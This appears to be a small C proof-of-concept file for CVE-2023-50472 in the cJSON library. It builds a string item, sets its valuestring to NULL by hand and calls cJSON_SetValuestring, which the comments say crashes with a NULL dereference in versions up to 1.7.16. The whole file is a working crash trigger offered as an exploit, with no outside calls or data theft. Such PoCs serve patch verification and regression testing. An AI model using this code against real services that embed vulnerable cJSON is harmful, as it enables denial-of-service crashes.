/*
 * PoC for CVE-2023-50472 (cJSON Issue #803)
 * Target: NULL pointer dereference on corrupted/uninitialized object
 */
#include <stdio.h>
#include "cJSON.h"

int main(void) {
    printf("[+] Creating string item and setting valuestring to NULL...\n");
    cJSON *item = cJSON_CreateString("corrupted");
    if (!item) return 1;

    // Manually corrupt or simulate allocation failure where valuestring is NULL
    item->valuestring = NULL;

    printf("[+] Calling cJSON_SetValuestring...\n");
    // In <= v1.7.16, this dereferences item->valuestring inside strlen() -> SIGSEGV
    cJSON_SetValuestring(item, "new_value");

    printf("[+] Completed execution safely.\n");
    cJSON_Delete(item);
    return 0;
}